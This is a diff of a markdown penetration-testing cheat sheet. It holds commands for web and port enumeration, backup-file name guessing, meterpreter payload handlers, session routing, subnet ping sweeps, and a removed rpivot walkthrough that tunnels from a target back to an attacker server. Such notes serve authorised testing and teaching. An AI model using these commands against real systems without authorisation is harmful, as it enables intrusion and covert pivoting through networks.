@@ -32,15 +32,13 @@ nmap -vv -n -Pn -sV -sC -sU -oN $'nmap.udp.'${HOST}$'.'$(date -Iseconds) $HOST
 
 ### HTTP Enumeration
 
-TODO: quick win file checks (~, .bak, , .swp, .swp~, .backup, .txt) x (.tar.gz, .gz)
-
 #### Directory Scanning
 
 [`gobuster`](https://github.com/OJ/gobuster) is the go-to tool for HTTP directory enumeration. Here's a good standard one-liner to get started:
 
 ```sh
 export URL=http://scanme.nmap.org/
-/opt/gobuster dir --useragent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -u $URL | tee $'gobuster.'$(date -Iseconds)
+gobuster dir --useragent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -u $URL | tee $'gobuster.'$(date -Iseconds)
 ```
 
 Don't forget to add `-x php,xhtml`-style arguments based on any determined common file extensions.
@@ -50,6 +48,13 @@ If you just want to look for some quick-and-easy wins, this `curl` snippet will 
 ```sh
 export URL=http://scanme.nmap.org
 for path in robots.txt sitemap.xml security.txt .git/HEAD; do curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' $URL/$path; done
+```
+
+If you have some known file names, you can generate permutations of "backup" versions of these files with the following:
+
+```sh
+export FILES='one two three'
+python3 -c "from itertools import product as p; print('\n'.join(a+b for a,b in p(__import__('os').getenv('FILES').split(),(c+d for c,d in p(['.bak','.swp','.backup','.txt'],['','~','.tgz','.zip','.tar.gz','.gz'])))))"
 ```
 
 #### Web Application Firewall (WAF) Detection
@@ -199,11 +204,9 @@ ftp.quit()
 
 You might want to turn this script into a one-line shell command. If so, check out [my one-liner-izing script](../scripts/encoding/any-python-one-liner-ize.py).
 
-## Pivoting
+### Internal Network Enumeration
 
-### Meterpreter Techniques
-
-#### Generating payloads
+### Meterpreter Payload
 
 Here are some snippets for generating common meterpreter payloads:
 
@@ -246,7 +249,7 @@ set LPORT 443
 run -j
 ```
 
-#### Routing through Sessions
+### Routing through Sessions
 
 If you have a meterpreter session on a jump point in the network, you can have tools implicitly route their traffic through that point by adding a routing rule in metasploit:
 
@@ -255,18 +258,7 @@ If you have a meterpreter session on a jump point in the network, you can have t
 route add 10.10.10.0/24 1
 ```
 
-### Scanning the Subnet
-
-#### Ping Scans
-
-If you don't care about being too loud, this `ping` snippet is a quick-and-dirty way of detecting adjacent hosts on your subnet:
-
-```sh
-export SUBNET=192.168.33
-for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i" &); done
-```
-
-#### Meterpreter Port Scanning
+### Meterpreter Port Scanning
 
 For TCP port scans from a meterpreter session, use the following:
 
@@ -278,58 +270,21 @@ set ports 1-65535
 
 This is especially useful when routing through existing meterpreter sessions.
 
-### Proxying Around
+### Ping Subnet Scanning
 
-#### Port Forwarding
-
-TODO: normal ssh portforwards
-
-#### SOCKS Proxying
-
-TODO
-
-#### Reverse SOCKS Proxying
-
-TODO: OpenSSH 7.6+ `ssh -R`
-
-Sometimes you end up on a box without credentials or any other of "forward" dynamic-proxying through it (through traditional `ssh -D` methods). In these cases, the [rpivot](https://github.com/klsecservices/rpivot) project is insanely useful. Think of it like a "reverse" `ssh -D`.
-
-It uses a client-server architecture, and only supports Python 2.6/2.7. On your attack machine, download and run the server:
+If you don't care about being too loud, this `ping` snippet is a quick-and-dirty way of detecting adjacent hosts on your subnet:
 
 ```sh
-# Download and package both the client and server into a zip file; allows for easier deployment.
-cd /opt && git clone https://github.com/klsecservices/rpivot && cd rpivot
-zip rpivot.zip -r *.py ./ntlm_auth/
-
-# Run the server on your attack machine.
-python rpivot.zip server --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
+export SUBNET=192.168.33
+for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i" &); done
 ```
 
-Then transfer the built `rpivot.zip` file to the target and connect the client back to the server:
+## Spraying Creds
 
-```sh
-# Connect back to attacker-controlled server at 10.10.10.10.
-python rpivot.zip client --server-ip 10.10.10.10 --server-port 9999
-```
-
-You should now be able to use `proxychains` (or another SOCKS4 proxy client) to tunnel through the machine where you ran the client.
-
-If you need to deploy the `rpivot` client to a target without Python, compile it into a standalone binary with [PyInstaller](https://www.pyinstaller.org/):
-
-```sh
-cd /opt/rpivot
-pyinstaller -F client.py
-file dist/client
-```
-
-The same can be done with the server, if necessary.
-
-### Spraying Creds
-
-#### SMB
+### SMB
 
 TODO: cme
 
-#### SSH
+### SSH
 
 TODO: hydra? medusa?
